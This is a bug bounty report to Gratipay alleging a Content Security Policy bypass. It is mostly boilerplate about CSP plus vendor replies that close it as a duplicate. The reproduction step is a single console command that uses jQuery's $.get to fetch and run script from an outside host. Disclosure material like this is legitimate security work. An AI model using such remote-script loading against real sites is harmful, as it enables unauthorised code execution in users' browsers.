title: CSP Policy Bypass and javascript execution Still Not Fixed

profile.name: Gratipay
profile.about: Gratitude? Gratipay! The easiest way for your company to pay for open source.

vulnerability_information:
# Summary

Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Javascript.


# Steps To Reproduce

  1. Open firefox or Chrome Press F12
  1. Now go to Console Tab
  1. $.get('https://sakurity.com/jqueryxss'); paste it and hit enter
  
# Patch
Update Jquery and Javascript Library 

# Supporting Material/References:
https://youtu.be/JgaSeKNleLA
vulnerability_information_html:
Summary

Content Security Policy (CSP) is a computer security standard introduced to prevent cross-site scripting (XSS), clickjacking and other code injection attacks resulting from execution of malicious content in the trusted web page context. CSP provides a standard method for website owners to declare approved origins of content that browsers should be allowed to load on that website — covered types are JavaScript, CSS, HTML frames, web workers, fonts, images, embeddable objects such as Javascript.

Steps To Reproduce

  1. Open firefox or Chrome Press F12
  2. Now go to Console Tab
  3. $.get('https://sakurity.com/jqueryxss'); paste it and hit enter

Patch

Update Jquery and Javascript Library

Supporting Material/References:

https://youtu.be/JgaSeKNleLA

activities.message:
Hi,

Thank you for your report, the receipt of which we herewith confirm. We are currently verifying the issue you reported.

Please expect additional feedback from us within the next couple of days. The "INFORMATION SECURITY" section of the following page has additional, useful information regarding our platform's security: http://inside.gratipay.com/howto/manage-risk

We appreciate your interest in securing our platform and look forward to working with you.

Yours sincerely,
The Gratipay Security Team

activities.message:
Hi @4w3,

We just publicly disclosed a report concerning this issue: https://hackerone.com/reports/241192. I do not want to hurt your signal or discourage you from reporting to us in the future, therefore I will close this report as a duplicate.

Best regards,
Ed
